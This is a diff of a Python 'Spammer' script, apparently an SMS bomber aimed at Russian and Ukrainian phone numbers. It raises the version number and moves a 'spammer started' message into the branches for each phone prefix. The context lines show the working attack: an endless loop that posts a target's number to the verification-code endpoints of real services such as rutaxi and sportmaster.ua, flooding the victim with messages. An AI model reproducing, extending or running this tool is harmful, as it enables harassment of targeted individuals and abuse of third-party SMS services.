@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-# Spammer v3.2
+# Spammer v3.4
 # Author: cludeex
 import os, random, time
 try:
@@ -61,9 +61,9 @@ def main(t):
         _email = _name+"@gmail.com"
         email = _email
         logo()
-        print("Телефон: "+color.BOLD+color.BLUE+_phone+color.END+"\nСпамер запущен.\nЧтобы остановить - нажмите Ctrl + Z")
         while True:
             if _phone[0] == "7":
+                print("Телефон: "+color.BOLD+color.BLUE+_phone+color.END+"\nСпамер запущен.\nЧтобы остановить - нажмите Ctrl + Z")
                 try:
                     requests.post("https://moscow.rutaxi.ru/ajax_keycode.html", data={"l": _phone9}).json()["res"]
                 except:
@@ -509,6 +509,7 @@ def main(t):
                 except:
                     pass
             if _phone[0] == "3" and _phone[1] == "8" and _phone[2] == "0":
+                print("Телефон: "+color.BOLD+color.BLUE+_phone+color.END+"\nСпамер запущен.\nЧтобы остановить - нажмите Ctrl + Z")
                 try:
                     requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": _phone})
                 except:
@@ -658,7 +659,6 @@ def main(t):
                 except:
                     pass
             else:
-                logo()
                 print(color.BOLD+color.RED+"[!] Неправильный номер.")
                 main(2)
     elif input1 == "2":
